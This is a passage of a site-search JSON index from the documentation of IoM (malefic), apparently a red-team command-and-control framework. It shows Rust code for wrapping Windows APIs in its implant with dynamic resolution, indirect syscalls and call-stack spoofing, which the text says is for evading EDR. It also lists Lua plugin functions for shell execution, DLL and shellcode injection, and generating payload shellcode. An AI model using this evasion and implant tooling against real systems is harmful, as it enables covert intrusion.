\u6765\u5b9e\u73b0\u7684\u3002</p>"},{"location":"IoM/manual/implant/win_kit/#\u7c7b\u578b\u58f0\u660e\u51fd\u6570\u5b9a\u4e49","title":"\u7c7b\u578b\u58f0\u660e/\u51fd\u6570\u5b9a\u4e49","text":"<p>windows\u7cfb\u7edf\u4e2d\u6709\u5927\u91cf\u9884\u5b9a\u4e49\u7684\u5e38\u91cf\uff0c\u6211\u4eec\u9700\u8981\u5728rust\u4e2d\u5b9a\u4e49C\u8bed\u8a00\u517c\u5bb9\u7684\u5e38\u91cf\u3002\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u7ec4rust \u5b8f\u5b9e\u73b0\u76f8\u5173\u5e38\u91cf/\u679a\u4e3e\u503c/\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\u3002</p> <p>\u4ee3\u7801\u4ed3\u5e93\u4e2d\u6709\u4e00\u4e2a <code>types</code> \u7684 <code>crate</code>, \u56e0\u6b64\u58f0\u660e\u90e8\u5206\u7531\u6b64\u800c\u6765, \u6211\u4eec\u53ef\u4ee5\u7b80\u8981\u5c06\u7c7b\u578b\u5206\u4e3a\u51e0\u79cd\uff0c \u7531\u4e8e <code>rust</code> \u8bed\u8a00\u7684\u7279\u6027\uff0c \u63d0\u4f9b\u4e86\u591a\u4e2a\u7684\u5b8f\u5b9e\u73b0 <code>rust</code> \u4e0e <code>c</code> \u7684\u7b49\u4ef7\u58f0\u660e\u3002</p>"},{"location":"IoM/manual/implant/win_kit/#\u7ed3\u6784\u4f53","title":"\u7ed3\u6784\u4f53","text":"<pre><code>STRUCT!{struct IMAGE_TLS_DIRECTORY32 {\n    StartAddressOfRawData: u32,\n    EndAddressOfRawData: u32,\n    AddressOfIndex: u32,\n    AddressOfCallBacks: u32,\n    SizeOfZeroFill: u32,\n    Characteristics: u32,\n}}\n</code></pre> <p>\u5176\u4e2d\uff0c \u7531\u4e8e <code>rust</code> \u5e76\u4e0d\u652f\u6301\u4f8b\u5982 <code>c</code> \u7c7b\u8bed\u8a00\u6309\u4f4d\u6570\u5206\u6210\u5458\u7684\u529f\u80fd\uff0c \u56e0\u6b64\u9700\u8981\u53e6\u4e00\u4e2a\u7279\u6b8a\u7684\u5b8f <code>BITFIELD!</code> \u6765\u8f85\u52a9\u5b8c\u6210\u8fd9\u4e2a\u76ee\u7684:</p> <pre><code>BITFIELD!{\n    IMAGE_TLS_DIRECTORY64 Characteristics: u32 [\n        Reserved0 set_Reserved0[0..20],\n        Alignment set_Alignment[20..24],\n        Reserved1 set_Reserved1[24..32],\n    ]\n}\n</code></pre>"},{"location":"IoM/manual/implant/win_kit/#\u679a\u4e3e","title":"\u679a\u4e3e","text":"<pre><code>ENUM!{\n    enum LDR_DDAG_STATE {\n    LdrModulesMerged = -5i32 as u32,\n    LdrModulesInitError = -4i32 as u32,\n    LdrModulesSnapError = -3i32 as u32,\n    LdrModulesUnloaded = -2i32 as u32,\n    LdrModulesUnloading = -1i32 as u32,\n    LdrModulesPlaceHolder = 0,\n    LdrModulesMapping = 1,\n    LdrModulesMapped = 2,\n    LdrModulesWaitingForDependencies = 3,\n    LdrModulesSnapping = 4,\n    LdrModulesSnapped = 5,\n    LdrModulesCondensed = 6,\n    LdrModulesReadyToInit = 7,\n    LdrModulesInitializing = 8,\n    LdrModulesReadyToRun = 9,\n    }\n}\n</code></pre>"},{"location":"IoM/manual/implant/win_kit/#\u8054\u5408\u4f53","title":"\u8054\u5408\u4f53","text":"<pre><code>UNION2!{\n    union LDR_DDAG_NODE_u {\n        Dependencies: LDRP_CSLIST,\n        RemovalLink: SINGLE_LIST_ENTRY,\n    }\n}\n</code></pre>"},{"location":"IoM/manual/implant/win_kit/#\u51fd\u6570","title":"\u51fd\u6570","text":"<p>\u800c\u51fd\u6570\u5c31\u7b80\u5355\u7684\u591a\u4e86\uff0c \u4e0e <code>rust</code> \u8bed\u6cd5\u65e0\u5f02\uff0c\u4f8b\u5982:</p> <pre><code>pub type DllMain = unsafe extern \"system\" fn(\n    *mut core::ffi::c_void,\n    u32,\n    *mut core::ffi::c_void\n) -&gt; i32;\n</code></pre>"},{"location":"IoM/manual/implant/win_kit/#malefic-\u51fd\u6570\u5c01\u88c5","title":"<code>MALEFIC</code> \u51fd\u6570\u5c01\u88c5","text":"<p>\u5728\u58f0\u660e\u4e86\u6211\u4eec\u6240\u9700\u7684\u5185\u5bb9\u540e\uff0c \u63a5\u4e0b\u6765\u5c31\u8981\u8fdb\u884c\u5e95\u5c42 <code>API</code> \u7684\u5305\u88c5\uff08wrapper\uff09\u4e86\u3002</p> <p>\u6b64\u65f6\u6211\u4eec\u5c06\u76ee\u5149\u79fb\u5411 <code>apis</code> \u8fd9\u4e00 <code>crate</code></p> <p>\u4e3a\u4fbf\u4e8e\u4ee3\u7801\u7f16\u5199\uff0c \u6211\u4eec\u4e5f\u63d0\u4f9b\u4e86\u5927\u91cf\u7684\u5b8f\u6765\u51cf\u5c11\u5de5\u4f5c\u91cf</p> <p>\u4e3a\u4e86\u8fbe\u6210\u6dfb\u52a0\u4e00\u4e2a\u65b0 <code>api</code> \u7684\u76ee\u7684\uff0c \u6211\u4eec\u9700\u8981\u5728\u4e09\u4e2a\u5730\u65b9\u6dfb\u52a0\u4ee3\u7801</p> <ul> <li>DynamicApis</li> <li>RashoGateApis (indirect syscall\u73b0\u5728\u88abEDR\u4e25\u683c\u67e5\u6740\uff0c \u4e0d\u63a8\u8350)</li> <li>Core/**</li> </ul> <p>\u4ee5\u5f15\u5165 <code>NtFreeVirtualMemory</code> \u4e3a\u4f8b</p>"},{"location":"IoM/manual/implant/win_kit/#1-\u5f15\u5165\u539f\u59cbapi","title":"1. \u5f15\u5165\u539f\u59cbAPI","text":"\u6dfb\u52a0RashoGateApis(\u5df2\u7ecf\u4e0d\u63a8\u8350) <p>\u5982\u679c\u9700\u8981\u4f7f\u7528 <code>syscall</code>\uff0c \u5219\u9700\u8981\u5728 <code>RashoGateApis</code> \u5904\u6dfb\u52a0\uff0c \u6dfb\u52a0\u65b9\u5f0f\u4e5f\u5f88\u7b80\u5355:</p> <pre><code>create_syscall_function!(ZW_CLOSE_VX, \"ZwClose\");\n</code></pre> <p>\u524d\u9762\u4e3a\u5168\u5c40\u6307\u9488\u540d\uff0c \u540e\u9762\u4e3a\u6dfb\u52a0\u7684\u51fd\u6570\u540d</p> <p>\u6dfb\u52a0<code>DynamicApis</code> \uff0c\u7531\u4e8e\u6240\u9700\u7684 <code>api</code> \u53ef\u80fd\u4f4d\u4e8e\u591a\u4e2a <code>dll</code> \u4e2d\uff0c \u56e0\u6b64\u9700\u8981\u533a\u5206\u5728\u54ea\u4e2a <code>dll</code> \u4e2d\uff0c \u65b9\u5f0f\u5982\u4e0b:</p> <pre><code>// ntdll\ncreate_nt_function!(NT_FREE_VIRTUAL_MEMORY, NtFreeVirtualMemory, \"NtFreeVirtualMemory\");\n\n// kernel32\ncreate_k32_function!(TLS_ALLOC, TlsAlloc, \"TlsAlloc\");\n\n// advapi32\ncreate_advapi32_function!(REG_OPEN_KEY_EX_A, RegOpenKeyExA, \"RegOpenKeyExA\");\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u540c\u6837\u4e3a\u5168\u5c40\u6307\u9488\u540d\uff0c \u7b2c\u4e8c\u4e2a\u4e3a\u6211\u4eec\u4e4b\u524d\u5728 <code>types</code> \u4e2d\u6dfb\u52a0\u7684\u51fd\u6570\u7b7e\u540d\uff0c \u7b2c\u4e09\u4e2a\u4e3a\u539f\u59cb\u51fd\u6570\u540d</p>"},{"location":"IoM/manual/implant/win_kit/#2-\u521b\u5efawrapper","title":"2. \u521b\u5efaWrapper","text":"<p>\u5b8c\u6210\u5230\u8fd9\u4e00\u6b65\uff0c \u610f\u5473\u7740\u6211\u4eec\u5df2\u7ecf\u5c06\u6240\u9700\u7684 <code>api</code> \u6210\u529f\u5f15\u5165\u5230\u5e95\u5c42\u7cfb\u7edf\u4e86\uff0c \u4e0b\u9762\u53ea\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a <code>wrapper</code> \u5373\u53ef\uff0c</p> <p>\u6211\u4eec\u7684 <code>wrapper</code> \u4f4d\u4e8e <code>apis/Core/**</code> \u4e2d\uff0c \u4e0b\u9762\u4e3a\u5982\u4f55\u5b9a\u4e49\u8fdb\u884c\u8bf4\u660e:</p> normal \u548c syscall feature <p>\u5bf9\u4e8e\u5f53\u524dEDR\u5bf9\u6297\u6765\u8bf4\uff0c \u5df2\u7ecf\u8f83\u5c11\u7528\u5230 <code>NORMAL</code> \u4ee5\u53ca <code>SYSCALL</code> \u8fd9\u4e24\u4e2a <code>feature</code> \u7684\uff0c\u4f46\u6211\u4eec\u8fd8\u662f\u4fdd\u7559\u4e86\u76f8\u5173\u7684\u5199\u6cd5\u3002</p> <pre><code>FUNC! {\n    fn MNtFreeVirtualMemory(handle: *const core::ffi::c_void, \n                            ptr: *mut *mut core::ffi::c_void, \n                            size: *mut usize) -&gt; i32 {\n        #[cfg(feature = \"NORMAL\")]\n        {\n            return windows_sys::Wdk::Storage::FileSystem::NtFreeVirtualMemory(\n                handle as _,\n                ptr,\n                size,\n                windows_sys::Win32::System::Memory::MEM_RELEASE\n            );\n        }\n        #[cfg(feature = \"DYNAMIC\")]\n        #[cfg(not(feature = \"SYSCALLS\"))]\n        {\n            match crate::apis::DynamicApis::NT_FREE_VIRTUAL_MEMORY.as_ref() {\n                Some(nfvm) =&gt; {\n                    #[cfg(all(feature = \"StackSpoofer\", target_arch = \"x86_64\"))]\n                    {\n                        return crate::call_spoofed_function!(\n                            *nfvm, \n                            handle, \n                            ptr, \n                            size, \n                            MEM_RELEASE\n                        ) as i32;\n                    }\n                    #[cfg(any(target_arch = \"x86\", not(feature = \"StackSpoofer\")))]\n                    {\n                        return nfvm(handle as _, ptr, size, MEM_RELEASE);\n                    }\n                },\n                None =&gt; {\n                    MAIEFIC_NT_FAILED_CODE\n                }\n            }\n        }\n        #[cfg(feature = \"SYSCALLS\")]\n        {\n            match crate::apis::RashoGateApis::\n                ZW_FREE_VIRTUAL_MEMORY_VX.as_ref() {\n                Some(vx) =&gt; {\n                    crate::rashoCall!(\n                        vx, handle, ptr, 0, size, MEM_RELEASE) as i32\n                },\n                None =&gt; {\n                    MAIEFIC_NT_FAILED_CODE\n                }\n            }\n        }\n     }\n}\n</code></pre> <p><code>NORMAL</code> \u610f\u5473\u7740\u4f7f\u7528\u7cfb\u7edf\u539f\u672c\u7684 <code>API</code>\uff0c \u800c <code>SYSCALL</code> \u975e\u5e38\u62d9\u52a3\u4e14\u5341\u5206\u6709\u9650\uff0c \u4e0d\u5efa\u8bae\u4f7f\u7528</p> <p>\u73b0\u5728\u6211\u4eec\u5c06 <code>DYNAMIC</code> \u5199\u6cd5\u6458\u51fa\u6765\u8fdb\u884c\u8fdb\u4e00\u6b65\u89e3\u91ca:</p> <pre><code>    fn MNtFreeVirtualMemory(\n        handle: *const core::ffi::c_void, \n        ptr: *mut *mut core::ffi::c_void, \n        size: *mut usize\n    ) -&gt; i32 {\n        // \u4f7f\u7528 DYNAMIC\u4e14\u6ca1\u4f7f\u7528SYSCALL\u65f6\n        #[cfg(feature = \"DYNAMIC\")]\n        #[cfg(not(feature = \"SYSCALLS\"))]\n        {\n            // \u9996\u5148\u83b7\u53d6\u6211\u4eec\u7684\u5168\u5c40\u6307\u9488\n            match crate::apis::DynamicApis::NT_FREE_VIRTUAL_MEMORY.as_ref() {\n                Some(nfvm) =&gt; {\n                    // \u5982\u679c\u5f00\u542f\u4e86\u5806\u6808\u6df7\u6dc6\u4e14\u4e3a64\u4f4d\u7a0b\u5e8f\u65f6\n                    #[cfg(all(feature = \"StackSpoofer\", target_arch = \"x86_64\"))]\n                    {\n                        // \u901a\u8fc7\u5806\u6808\u6df7\u6dc6\u8fdb\u884c\u8c03\u7528\n                        return crate::call_spoofed_function!(\n                            *nfvm, // \u51fd\u6570\u5730\u5740\n                            handle,\n                            ptr, \n                            size, \n                            MEM_RELEASE\n                        ) as i32;\n                    }\n                    // \u672a\u5f00\u5806\u6808\u6df7\u6dc6\u621632\u4f4d\u65f6\uff0c \u4f7f\u7528\u52a8\u6001api\u8c03\u7528\n                    #[cfg(any(target_arch = \"x86\", not(feature = \"StackSpoofer\")))]\n                    {\n                        return nfvm(handle as _, ptr, size, MEM_RELEASE);\n                    }\n                },\n                None =&gt; {\n                    MAIEFIC_NT_FAILED_CODE\n                }\n            }\n        }\n    }\n</code></pre>"},{"location":"IoM/manual/implant/win_kit/#\u6dfb\u52a0\u5230bof\u4e2d","title":"\u6dfb\u52a0\u5230BOF\u4e2d","text":"<p>\u73b0\u5728\u6211\u4eec\u6709\u4e86\u6211\u4eec\u65b0\u589e\u52a0\u7684 <code>MFunc</code> \u4e86\uff0c \u63a5\u4e0b\u6765\u8981\u505a\u7684\u4e8b\u60c5\u5c31\u7b80\u5355\u5f88\u591a\u4e86\uff0c \u6211\u4eec\u53ea\u9700\u5173\u6ce8\u4e00\u4e2a\u6587\u4ef6\u5373\u53ef:</p> <ul> <li>bof/beacon_apis</li> </ul> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u53ea\u9700\u5728 <code>INTERNEL_FUNCS</code> \u8fd9\u4e00\u5168\u5c40\u53d8\u91cf\u4e2d\u589e\u52a0\u6211\u4eec\u7684 <code>api</code> \u5373\u53ef\uff0c \u5982</p> <pre><code>m.insert(obfstr!(\"NtFreeVirtualMemory\").to_string(), NtFreeVirtualMemory as usize);\n</code></pre> <p>enjoy it :)</p>"},{"location":"IoM/manual/implant/win_kit/#\u5728\u5176\u4ed6\u5730\u65b9\u4f7f\u7528-malefic-\u51fd\u6570","title":"\u5728\u5176\u4ed6\u5730\u65b9\u4f7f\u7528 <code>MALEFIC</code> \u51fd\u6570","text":""},{"location":"IoM/manual/implant/win_kit/#\u6e90\u7801\u7f16\u8bd1\u4f7f\u7528","title":"\u6e90\u7801\u7f16\u8bd1\u4f7f\u7528","text":"<p>\u5982\u679c\u60f3\u5728\u4f8b\u5982 <code>malefic-helper</code> \u4e2d\u4f7f\u7528\u6211\u4eec\u7684 <code>MaleficApi</code>\uff0c \u53ea\u9700\u5c06\u4f7f\u7528\u7cfb\u7edf <code>api</code> \u66ff\u6362\u4e3a <code>M*</code> \u5373\u53ef</p>"},{"location":"IoM/manual/implant/win_kit/#\u5bfc\u51fa\u4f7f\u7528","title":"\u5bfc\u51fa\u4f7f\u7528","text":"<p>\u800c\u5982\u679c\u9700\u8981\u5bfc\u51fa\u5230 <code>DLL</code> \u4e2d\uff0c \u5219\u9700\u8981\u8fdb\u4e00\u6b65\u8f6c\u5316\u4e3a <code>FFI</code> \u63a5\u53e3\uff0c \u6211\u4eec\u8fd8\u662f\u4ee5 <code>NtFreeVirtualMemory</code> \u51fd\u6570\u4e3e\u4f8b:</p> <p>\u5728 <code>winkit</code> \u4e2d <code>ffi/mod.rs</code> \u4e2d\u521b\u5efa <code>ffi</code> \u51fd\u6570:</p> <pre><code>#[no_mangle]\npub unsafe extern \"C\" fn MNtFreeVirtualMemory(\n        handle: *const core::ffi::c_void, \n        ptr: *mut *mut core::ffi::c_void, \n        size: *mut usize\n    ) -&gt; i32 {\n        crate::apis::xxxx::MNtFreeVirtualMemory(handle, ptr, size) // xxxx:: \u4e3acrate\u4f4d\u7f6e\n}\n</code></pre> <p>\u5e76\u5728 <code>helper</code> \u7684\u63a5\u53e3\u6587\u4ef6 <code>malefic-helper\\src\\win\\kit\\mod.rs</code> \u4e2d\u5f15\u5165\u58f0\u660e:</p> <pre><code>#[cfg(target_os = \"windows\")]\n#[cfg(feature = \"prebuild\")]\n#[link(name = \"malefic_win_kit\", kind = \"static\")]\nextern \"C\" {\n        ...\n        fn MNtFreeVirtualMemory(\n                handle: *const core::ffi::c_void, \n                ptr: *mut *mut core::ffi::c_void, \n                size: *mut usize\n        ) -&gt; i32;\n        ...\n}\n</code></pre> <p>\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528\u5373\u53ef :)</p>"},{"location":"IoM/manual/implant/win_kit/#ref","title":"Ref","text":"<p>\u6700\u540e\uff0c \u611f\u8c22\u5927\u91cf\u4f18\u79c0\u7684\u5f00\u6e90\u9879\u76ee\u53ca\u5f00\u53d1\u8005\u4eec</p> <ul> <li>https://github.com/yamakadi/clroxide/</li> <li>https://github.com/MSxDOS/ntapi</li> <li>https://github.com/trickster0/EDR_Detector/blob/master/EDR_Detector.rs </li> <li>https://github.com/Fropops/Offensive-Rust</li> <li>https://github.com/wildbook/hwbp-rs</li> <li>https://github.com/bats3c/DarkLoadLibrary/blob/master/DarkLoadLibrary/ </li> <li>https://github.com/b4rtik/metasploit-execute-assembly</li> <li>https://github.com/lap1nou/CLR_Heap_encryption</li> <li>https://github.com/med0x2e/ExecuteAssembly/</li> <li>https://github.com/postrequest/link</li> <li>https://github.com/hakaioffsec/coffee/</li> <li>https://github.com/Kudaes/Unwinder</li> <li>https://github.com/klezVirus/SilentMoonwalk</li> <li>https://github.com/rapid7/metasploit-framework</li> <li>https://github.com/BishopFox/sliver</li> </ul>"},{"location":"IoM/manual/mal/","title":"index","text":"<p>mals\u662fIoM\u7684\u63d2\u4ef6\u4ed3\u5e93, \u53ef\u4ee5\u901a\u8fc7lua/go\u4e3aIoM\u7f16\u5199\u63d2\u4ef6\u811a\u672c</p> <p>\u5e76\u63d0\u4f9b\u4e86\u5b98\u65b9\u7d22\u5f15\u4ed3\u5e93: https://github.com/chainreactors/mals </p>"},{"location":"IoM/manual/mal/#mal-community","title":"mal-community","text":"<p>mal-community \u662f\u4e00\u7ec4\u901a\u7528\u63d2\u4ef6\u7684\u5408\u96c6, \u8fd9\u4e9b\u63d2\u4ef6\u5927\u591a\u6765\u81ea\u4e3aCobaltstrike\u5b9e\u73b0\u7684aggressive script , \u901a\u8fc7\u5c06CNA\u79fb\u690d\u5230mal, \u4f7f\u5176\u80fd\u8fd0\u884c\u5728IoM\u751f\u6001\u4e0a. </p> <p>repo: https://github.com/chainreactors/mal-community</p> <p>mal-community\u5206\u4e3a\u591a\u4e2a\u7ec6\u5206\u7528\u9014\u7684\u5b50\u76ee\u5f55, \u53ef\u4ee5\u72ec\u7acb\u5b89\u88c5</p> <ul> <li>community-lib ,\u5de5\u5177\u5e93, \u53ef\u4ee5\u5f53\u4f5c\u5e93\u88ab\u5176\u4ed6\u63d2\u4ef6\u4f7f\u7528<ul> <li>sharpblock </li> <li>NET.BOF (TODO)</li> <li>No-Consolation</li> </ul> </li> <li>community-common, \u5e38\u7528\u5de5\u5177\u5305<ul> <li>OperatorsKit</li> <li>CS-Remote-OPs-BOF</li> <li>CS-Situational-Awareness-BOF</li> <li>chainreactor\u5de5\u5177<ul> <li>gogo</li> <li>zombie</li> </ul> </li> <li>misc \u672a\u5206\u7c7b\u7684\u5e38\u7528\u5de5\u5177\u96c6\u5408</li> </ul> </li> <li>community-elevate \u63d0\u6743\u5de5\u5177\u5305<ul> <li>ElevateKit</li> <li>UAC-BOF-Bonanza</li> </ul> </li> <li>community-proxy \u4ee3\u7406\u5de5\u5177\u5305<ul> <li>gost</li> </ul> </li> <li>community-move \u6a2a\u5411\u79fb\u52a8\u5de5\u5177\u5305</li> <li>community-persistence \u6743\u9650\u7ef4\u6301\u5de5\u5177\u5305</li> <li>community-domain \u57df\u6e17\u900f\u5de5\u5177\u5305</li> </ul>"},{"location":"IoM/manual/mal/#mal-api","title":"mal api","text":"<p>mal \u662f\u4e00\u4e2a\u652f\u6301\u591a\u8bed\u8a00\u7684\u63d2\u4ef6\u7cfb\u7edf, \u4f46\u76ee\u524d\u53ea\u6709lua\u8fbe\u5230\u57fa\u672c\u53ef\u7528\u9636\u6bb5, \u56e0\u6b64\u4ec5\u63d0\u4f9b\u57fa\u4e8elua\u8bed\u8a00\u5b9e\u73b0\u7684\u6587\u6863.</p>"},{"location":"IoM/manual/mal/beacon/","title":"beacon","text":""},{"location":"IoM/manual/mal/beacon/#basic","title":"basic","text":""},{"location":"IoM/manual/mal/beacon/#bcat","title":"bcat","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bcd","title":"bcd","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bcp","title":"bcp","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bcurl","title":"bcurl","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>url</code> [string] -  target url</li> </ul> <p>Example</p> <pre><code>bcurl(active(),\"http://example.com\")\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bdllinject","title":"bdllinject","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [number] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bdllspawn","title":"bdllspawn","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [number] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bdownload","title":"bdownload","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#benv","title":"benv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bexecute","title":"bexecute","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>cmd</code> [string] -  command to execute</li> </ul> <p>Example</p> <pre><code>bexecute(active(),\"whoami\")\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bexecute_assembly","title":"bexecute_assembly","text":"<p>Arguments</p> <ul> <li><code>sessions</code> [Session] - </li> <li><code>path</code> [string] - </li> <li><code>args</code> [string] - </li> </ul> <p>Example</p> <pre><code>bexecute_assembly(active(),\"sharp.exe\",{})\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bexecute_exe","title":"bexecute_exe","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [SacrificeProcess] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#binline_dll","title":"binline_dll","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#binline_exe","title":"binline_exe","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#binline_execute","title":"binline_execute","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>bofPath</code> [string] -  path to BOF</li> <li><code>args</code> [string] -  arguments</li> </ul> <p>Example</p> <pre><code>binline_execute(active(),\"/path/dir.x64.o\",\"/path/to/list\")\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#binline_shellcode","title":"binline_shellcode","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bkill","title":"bkill","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bls","title":"bls","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  path to list files</li> </ul> <p>Example</p> <pre><code>bls(active(),\"/tmp\")\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bmkdir","title":"bmkdir","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bmv","title":"bmv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bnetstat","title":"bnetstat","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bpowerpick","title":"bpowerpick","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  powershell script</li> <li><code>ps</code> [string] -  ps args</li> </ul> <p>Example</p> <pre><code>bpowerpick(active(),\"powerview.ps1\",{\"\"}))\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bpowershell","title":"bpowershell","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] - </li> <li><code>cmd</code> [string] - </li> </ul> <p>Example</p> <pre><code>bpowershell(active(),\"dir\")\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bps","title":"bps","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bpwd","title":"bpwd","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#breg_queryv","title":"breg_queryv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#breq_query","title":"breq_query","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#brm","title":"brm","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bsetenv","title":"bsetenv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bshell","title":"bshell","text":"<p>Arguments</p> <ul> <li><code>sessions</code> [Session] - </li> <li><code>cmd</code> [string] - </li> </ul> <p>Example</p> <pre><code>bshell(active(),\"whoami\",true)\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bshinject","title":"bshinject","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [number] </li> <li><code>$3</code> [string] </li> <li><code>$4</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bsleep","title":"bsleep","text":"<p>Arguments</p> <ul> <li><code>sess</code> [Session] - special session</li> <li><code>interval</code> [number] - time interval, in seconds</li> </ul> <p>Example</p> <pre><code>sleep(active(), 10)\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#bunsetenv","title":"bunsetenv","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bupload","title":"bupload","text":"<p>Arguments</p> <ul> <li><code>session</code> [Session] -  special session</li> <li><code>path</code> [string] -  source path</li> </ul> <p>Example</p> <pre><code>bupload(active(),\"/source/path\")\n</code></pre>"},{"location":"IoM/manual/mal/beacon/#buploadraw","title":"buploadraw","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> <li><code>$2</code> [string] </li> <li><code>$3</code> [string] </li> </ul>"},{"location":"IoM/manual/mal/beacon/#bwhoami","title":"bwhoami","text":"<p>Arguments</p> <ul> <li><code>$1</code> [Session] </li> </ul>"},{"location":"IoM/manual/mal/builtin/","title":"builtin","text":""},{"location":"IoM/manual/mal/builtin/#artifact","title":"artifact","text":""},{"location":"IoM/manual/mal/builtin/#artifact_payload","title":"artifact_payload","text":"<p>get artifact stageless shellcode</p> <p>Arguments</p> <ul> <li><code>pipeline</code> [string] -  pipeline id</li> <li><code>format</code> [string] -  reserved parameter</li> <li><code>os</code> [string] -  os, windows only</li> <li><code>arch</code> [string] -  arch, x64/x86</li> </ul> <p>Example</p> <pre><code>artifact_payload(\"tcp_default\",\"raw\",\"windows\",\"x64\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#artifact_stager","title":"artifact_stager","text":"<p>get artifact stager shellcode</p> <p>Arguments</p> <ul> <li><code>pipeline</code> [string] -  pipeline id</li> <li><code>format</code> [string] -  reserved parameter</li> <li><code>os</code> [string] -  os, windows only</li> <li><code>arch</code> [string] -  arch, x64/x86</li> </ul> <p>Example</p> <pre><code>artifact_stager(\"tcp_default\",\"raw\",\"windows\",\"x64\")\n</code></pre>"},{"location":"IoM/manual/mal/builtin/#clr2shellcode","title":"clr2shellcode","text":"<p>clr to shellcode with donut</p> <p>Arguments</p> <ul> <li><code>file</code> [string] -  path to PE file</li> <li><code>arch</code> [string] -  architecture, x86/x64</li> <li><code>cmdline</code> [string] -  cmd args</li> <li><code>method</code> [string] -  name of method or DLL function to invoke for .NET DLL and unmanaged DLL</li> <li><code>classname</code> [string] -  name of class with optional namespace for .NET DLL</li> <li><code>appdomain</code> [string] -  name of domain to create for .NET DLL/EXE</li> </ul>"},{"location":"IoM/manual/mal/builtin/#delete_artifact","title":"delete_artifact","text":"<p>delete artifact with special build name</p> <p>Arguments</p> <ul> <li><code>$1</code> [string] - </li> </ul>"},{"location":"IoM/manual/mal/builtin/#dll2shellcode","title":"dll2shellcode","text":"<p>dll to shellcode with donut</p> <p>Arguments</p> <ul> <li><code>bin</code> [table] -  dll bin</li> <li><code>arch</code> [string] -  architecture, x86/x64</li> <li><code>param</code> [string] -  cmd args</li> 